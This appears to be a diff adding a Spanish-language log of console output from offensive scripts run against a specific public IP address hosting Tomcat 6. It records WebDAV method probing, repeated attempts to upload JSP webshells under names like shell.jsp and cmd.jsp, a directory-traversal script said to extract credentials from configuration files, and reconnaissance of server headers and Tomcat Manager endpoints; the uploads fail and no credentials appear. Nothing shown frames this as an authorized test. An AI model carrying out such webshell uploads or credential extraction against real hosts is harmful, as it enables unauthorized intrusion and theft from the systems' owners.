@@ -1,0 +1,45 @@
+Resultados de Script de Explotación WebDAV: 
+=== EXPLOTACIÓN WEBDAV TOMCAT 6 ===
+[*] Verificando permisos de WebDAV...
+[+] WebDAV PROPFIND responde: 501
+
+[*] Probando creación de directorios via MKCOL...
+
+[*] Intentando upload de webshell via WebDAV PUT...
+[*] Intentando upload a: https://189.254.143.102/webdav/shell.jsp
+[-] Upload falló: 404
+[*] Intentando upload a: https://189.254.143.102/webdav/cmd.jsp
+[-] Upload falló: 404
+[*] Intentando upload a: https://189.254.143.102/webdav/test.jsp
+[-] Upload falló: 404
+[*] Intentando upload a: https://189.254.143.102/webdav/exploit.jsp
+[-] Upload falló: 404
+[*] Intentando upload a: https://189.254.143.102/webdav/uploads/shell.jsp
+[-] Upload falló: 404
+[*] Intentando upload a: https://189.254.143.102/webdav/wwwroot/shell.jsp
+[-] Upload falló: 404
+[-] No se pudo subir webshell, intentando métodos alternativos...
+
+[*] Probando métodos alternativos de upload...
+PS C:\Users\MarxB\desktop\ProyectoSito>
+
+Script de Directory Traversal Profundo Resultados:
+PS C:\Users\MarxB\desktop\ProyectoSito> py DTrans.py
+[*] Ejecutando directory traversal específico para Tomcat 6...
+
+[*] Extrayendo credenciales de configuraciones...
+PS C:\Users\MarxB\desktop\ProyectoSito>
+
+Analisis server Resultados:
+PS C:\Users\MarxB\desktop\ProyectoSito> py .\AServer.py
+[*] Analizando headers del servidor...
+[+] Información del servidor:
+    Server: Apache-Coyote/1.1
+    X-Powered-By: No info
+    X-AspNet-Version: No info
+    Set-Cookie: No cookies
+
+[*] Verificando estado del Tomcat Manager...
+[+] Manager protegido: https://189.254.143.102/manager/status
+[+] Manager protegido: https://189.254.143.102/manager/jmxproxy
+[+] Manager protegido: https://189.254.143.102/manager/list
